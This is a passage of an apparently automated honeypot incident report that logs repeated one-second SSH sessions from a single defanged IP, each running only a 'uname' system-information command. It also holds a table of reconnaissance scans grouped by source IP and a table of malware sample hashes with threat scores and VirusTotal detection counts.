| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:53:24` | `cowrie.session.connect` |
| `2026-09-20 16:53:24` | `cowrie.client.version` |
| `2026-09-20 16:53:24` | `cowrie.client.kex` |
| `2026-09-20 16:53:25` | `cowrie.login.success` |
| `2026-09-20 16:53:25` | `cowrie.session.params` |
| `2026-09-20 16:53:25` | `cowrie.command.input` |
| `2026-09-20 16:53:26` | `cowrie.log.closed` |
| `2026-09-20 16:53:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-576187dbe206

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:53 |
| **Last Seen** | 2026-09-20 16:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:53:30` | `cowrie.session.connect` |
| `2026-09-20 16:53:30` | `cowrie.client.version` |
| `2026-09-20 16:53:30` | `cowrie.client.kex` |
| `2026-09-20 16:53:30` | `cowrie.login.success` |
| `2026-09-20 16:53:31` | `cowrie.session.params` |
| `2026-09-20 16:53:31` | `cowrie.command.input` |
| `2026-09-20 16:53:31` | `cowrie.log.closed` |
| `2026-09-20 16:53:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a364d2282f97

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:53 |
| **Last Seen** | 2026-09-20 16:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:53:35` | `cowrie.session.connect` |
| `2026-09-20 16:53:35` | `cowrie.client.version` |
| `2026-09-20 16:53:35` | `cowrie.client.kex` |
| `2026-09-20 16:53:35` | `cowrie.login.success` |
| `2026-09-20 16:53:36` | `cowrie.session.params` |
| `2026-09-20 16:53:36` | `cowrie.command.input` |
| `2026-09-20 16:53:37` | `cowrie.log.closed` |
| `2026-09-20 16:53:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b41f7bfb6d04

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:53 |
| **Last Seen** | 2026-09-20 16:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:53:40` | `cowrie.session.connect` |
| `2026-09-20 16:53:40` | `cowrie.client.version` |
| `2026-09-20 16:53:40` | `cowrie.client.kex` |
| `2026-09-20 16:53:41` | `cowrie.login.success` |
| `2026-09-20 16:53:41` | `cowrie.session.params` |
| `2026-09-20 16:53:41` | `cowrie.command.input` |
| `2026-09-20 16:53:42` | `cowrie.log.closed` |
| `2026-09-20 16:53:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6db83f3379f8

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:53 |
| **Last Seen** | 2026-09-20 16:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:53:45` | `cowrie.session.connect` |
| `2026-09-20 16:53:45` | `cowrie.client.version` |
| `2026-09-20 16:53:45` | `cowrie.client.kex` |
| `2026-09-20 16:53:45` | `cowrie.login.success` |
| `2026-09-20 16:53:46` | `cowrie.session.params` |
| `2026-09-20 16:53:46` | `cowrie.command.input` |
| `2026-09-20 16:53:46` | `cowrie.log.closed` |
| `2026-09-20 16:53:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8cc3feb47e9

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:53 |
| **Last Seen** | 2026-09-20 16:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:53:50` | `cowrie.session.connect` |
| `2026-09-20 16:53:50` | `cowrie.client.version` |
| `2026-09-20 16:53:50` | `cowrie.client.kex` |
| `2026-09-20 16:53:51` | `cowrie.login.success` |
| `2026-09-20 16:53:52` | `cowrie.session.params` |
| `2026-09-20 16:53:52` | `cowrie.command.input` |
| `2026-09-20 16:53:52` | `cowrie.log.closed` |
| `2026-09-20 16:53:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c394fb873078

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:53 |
| **Last Seen** | 2026-09-20 16:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:53:56` | `cowrie.session.connect` |
| `2026-09-20 16:53:56` | `cowrie.client.version` |
| `2026-09-20 16:53:56` | `cowrie.client.kex` |
| `2026-09-20 16:53:57` | `cowrie.login.success` |
| `2026-09-20 16:53:58` | `cowrie.session.params` |
| `2026-09-20 16:53:58` | `cowrie.command.input` |
| `2026-09-20 16:53:58` | `cowrie.log.closed` |
| `2026-09-20 16:53:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-395aedb610ad

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:54 |
| **Last Seen** | 2026-09-20 16:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:54:01` | `cowrie.session.connect` |
| `2026-09-20 16:54:01` | `cowrie.client.version` |
| `2026-09-20 16:54:02` | `cowrie.client.kex` |
| `2026-09-20 16:54:02` | `cowrie.login.success` |
| `2026-09-20 16:54:03` | `cowrie.session.params` |
| `2026-09-20 16:54:03` | `cowrie.command.input` |
| `2026-09-20 16:54:03` | `cowrie.log.closed` |
| `2026-09-20 16:54:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-585fc2d916d7

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:54 |
| **Last Seen** | 2026-09-20 16:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:54:06` | `cowrie.session.connect` |
| `2026-09-20 16:54:06` | `cowrie.client.version` |
| `2026-09-20 16:54:06` | `cowrie.client.kex` |
| `2026-09-20 16:54:07` | `cowrie.login.success` |
| `2026-09-20 16:54:08` | `cowrie.session.params` |
| `2026-09-20 16:54:08` | `cowrie.command.input` |
| `2026-09-20 16:54:08` | `cowrie.log.closed` |
| `2026-09-20 16:54:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95ecf2790792

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:54 |
| **Last Seen** | 2026-09-20 16:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:54:11` | `cowrie.session.connect` |
| `2026-09-20 16:54:11` | `cowrie.client.version` |
| `2026-09-20 16:54:11` | `cowrie.client.kex` |
| `2026-09-20 16:54:12` | `cowrie.login.success` |
| `2026-09-20 16:54:13` | `cowrie.session.params` |
| `2026-09-20 16:54:13` | `cowrie.command.input` |
| `2026-09-20 16:54:13` | `cowrie.log.closed` |
| `2026-09-20 16:54:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8baad37a29f0

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:54 |
| **Last Seen** | 2026-09-20 16:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:54:17` | `cowrie.session.connect` |
| `2026-09-20 16:54:17` | `cowrie.client.version` |
| `2026-09-20 16:54:17` | `cowrie.client.kex` |
| `2026-09-20 16:54:18` | `cowrie.login.success` |
| `2026-09-20 16:54:19` | `cowrie.session.params` |
| `2026-09-20 16:54:19` | `cowrie.command.input` |
| `2026-09-20 16:54:19` | `cowrie.log.closed` |
| `2026-09-20 16:54:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35ec9888bcf0

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:54 |
| **Last Seen** | 2026-09-20 16:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:54:23` | `cowrie.session.connect` |
| `2026-09-20 16:54:23` | `cowrie.client.version` |
| `2026-09-20 16:54:23` | `cowrie.client.kex` |
| `2026-09-20 16:54:24` | `cowrie.login.success` |
| `2026-09-20 16:54:25` | `cowrie.session.params` |
| `2026-09-20 16:54:25` | `cowrie.command.input` |
| `2026-09-20 16:54:25` | `cowrie.log.closed` |
| `2026-09-20 16:54:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c658e2b808c

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:54 |
| **Last Seen** | 2026-09-20 16:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:54:28` | `cowrie.session.connect` |
| `2026-09-20 16:54:28` | `cowrie.client.version` |
| `2026-09-20 16:54:28` | `cowrie.client.kex` |
| `2026-09-20 16:54:28` | `cowrie.login.success` |
| `2026-09-20 16:54:29` | `cowrie.session.params` |
| `2026-09-20 16:54:29` | `cowrie.command.input` |
| `2026-09-20 16:54:29` | `cowrie.log.closed` |
| `2026-09-20 16:54:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf3034ec2220

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:54 |
| **Last Seen** | 2026-09-20 16:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:54:33` | `cowrie.session.connect` |
| `2026-09-20 16:54:33` | `cowrie.client.version` |
| `2026-09-20 16:54:33` | `cowrie.client.kex` |
| `2026-09-20 16:54:34` | `cowrie.login.success` |
| `2026-09-20 16:54:35` | `cowrie.session.params` |
| `2026-09-20 16:54:35` | `cowrie.command.input` |
| `2026-09-20 16:54:35` | `cowrie.log.closed` |
| `2026-09-20 16:54:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49dfca8411be

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:54 |
| **Last Seen** | 2026-09-20 16:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:54:38` | `cowrie.session.connect` |
| `2026-09-20 16:54:38` | `cowrie.client.version` |
| `2026-09-20 16:54:38` | `cowrie.client.kex` |
| `2026-09-20 16:54:39` | `cowrie.login.success` |
| `2026-09-20 16:54:39` | `cowrie.session.params` |
| `2026-09-20 16:54:39` | `cowrie.command.input` |
| `2026-09-20 16:54:40` | `cowrie.log.closed` |
| `2026-09-20 16:54:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a758b0e0dbe

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:54 |
| **Last Seen** | 2026-09-20 16:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:54:44` | `cowrie.session.connect` |
| `2026-09-20 16:54:44` | `cowrie.client.version` |
| `2026-09-20 16:54:44` | `cowrie.client.kex` |
| `2026-09-20 16:54:44` | `cowrie.login.success` |
| `2026-09-20 16:54:45` | `cowrie.session.params` |
| `2026-09-20 16:54:45` | `cowrie.command.input` |
| `2026-09-20 16:54:45` | `cowrie.log.closed` |
| `2026-09-20 16:54:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10852a34d8ce

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:54 |
| **Last Seen** | 2026-09-20 16:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:54:49` | `cowrie.session.connect` |
| `2026-09-20 16:54:49` | `cowrie.client.version` |
| `2026-09-20 16:54:49` | `cowrie.client.kex` |
| `2026-09-20 16:54:50` | `cowrie.login.success` |
| `2026-09-20 16:54:51` | `cowrie.session.params` |
| `2026-09-20 16:54:51` | `cowrie.command.input` |
| `2026-09-20 16:54:51` | `cowrie.log.closed` |
| `2026-09-20 16:54:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a58ee1e68465

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:54 |
| **Last Seen** | 2026-09-20 16:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:54:54` | `cowrie.session.connect` |
| `2026-09-20 16:54:54` | `cowrie.client.version` |
| `2026-09-20 16:54:54` | `cowrie.client.kex` |
| `2026-09-20 16:54:55` | `cowrie.login.success` |
| `2026-09-20 16:54:56` | `cowrie.session.params` |
| `2026-09-20 16:54:56` | `cowrie.command.input` |
| `2026-09-20 16:54:56` | `cowrie.log.closed` |
| `2026-09-20 16:54:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3c35526b4cf

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:55 |
| **Last Seen** | 2026-09-20 16:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:55:00` | `cowrie.session.connect` |
| `2026-09-20 16:55:00` | `cowrie.client.version` |
| `2026-09-20 16:55:00` | `cowrie.client.kex` |
| `2026-09-20 16:55:00` | `cowrie.login.success` |
| `2026-09-20 16:55:01` | `cowrie.session.params` |
| `2026-09-20 16:55:01` | `cowrie.command.input` |
| `2026-09-20 16:55:01` | `cowrie.log.closed` |
| `2026-09-20 16:55:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `104.194.10[.]16` | **14** | 2026-09-20 14:56 | 2026-09-20 16:46 | 9m | 0 | `T1592` | 🟠 MEDIUM |
| `64.207.185[.]5` | **8** | 2026-09-20 14:55 | 2026-09-20 16:03 | 4m | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | **5** | 2026-09-20 14:55 | 2026-09-20 16:24 | 4m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]177` | **5** | 2026-09-20 16:53 | 2026-09-20 16:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `179.56.17[.]84` | **3** | 2026-09-20 15:09 | 2026-09-20 15:09 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]110` | **3** | 2026-09-20 16:52 | 2026-09-20 16:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]47` | **3** | 2026-09-20 16:53 | 2026-09-20 16:54 | 0m | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | **2** | 2026-09-20 15:06 | 2026-09-20 16:51 | 0m | 0 | `T1592` | 🟢 LOW |
| `181.78.223[.]105` | **2** | 2026-09-20 15:20 | 2026-09-20 15:21 | 0m | 0 | `T1592` | 🟢 LOW |
| `185.106.29[.]190` | **2** | 2026-09-20 15:36 | 2026-09-20 15:37 | 0m | 0 | `T1592` | 🟢 LOW |
| `104.152.52[.]201` | 1 | 2026-09-20 15:21 | 2026-09-20 15:21 | 0s | 0 | `T1592` | 🟢 LOW |
| `104.152.52[.]216` | 1 | 2026-09-20 15:19 | 2026-09-20 15:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]61` | 1 | 2026-09-20 16:47 | 2026-09-20 16:47 | 8s | 0 | `T1592` | 🟢 LOW |
| `115.175.71[.]85` | 1 | 2026-09-20 14:58 | 2026-09-20 15:00 | 120s | 0 | `T1592` | 🟢 LOW |
| `140.99.83[.]52` | 1 | 2026-09-20 16:34 | 2026-09-20 16:34 | 4s | 0 | `T1592` | 🟢 LOW |
| `142.93.32[.]174` | 1 | 2026-09-20 16:49 | 2026-09-20 16:49 | 8s | 0 | `T1592` | 🟢 LOW |
| `152.32.163[.]183` | 1 | 2026-09-20 15:00 | 2026-09-20 15:00 | 13s | 0 | `T1592` | 🟢 LOW |
| `180.184.141[.]117` | 1 | 2026-09-20 15:14 | 2026-09-20 15:16 | 120s | 0 | `T1592` | 🟢 LOW |
| `193.90.12[.]122` | 1 | 2026-09-20 15:11 | 2026-09-20 15:11 | 45s | 0 | `T1592` | 🟢 LOW |
| `195.78.100[.]163` | 1 | 2026-09-20 16:32 | 2026-09-20 16:32 | 12s | 0 | `T1592` | 🟢 LOW |
| `200.59.96[.]31` | 1 | 2026-09-20 16:17 | 2026-09-20 16:18 | 10s | 0 | `T1592` | 🟢 LOW |
| `212.28.184[.]195` | 1 | 2026-09-20 15:24 | 2026-09-20 15:24 | 0s | 0 | `T1592` | 🟢 LOW |
| `62.210.198[.]27` | 1 | 2026-09-20 15:01 | 2026-09-20 15:01 | 32s | 0 | `T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-09-20 16:03 | 2026-09-20 16:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.228.62[.]150` | 1 | 2026-09-20 15:33 | 2026-09-20 15:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `69.5.169[.]50` | 1 | 2026-09-20 16:02 | 2026-09-20 16:02 | 10s | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]50` | 1 | 2026-09-20 16:34 | 2026-09-20 16:34 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
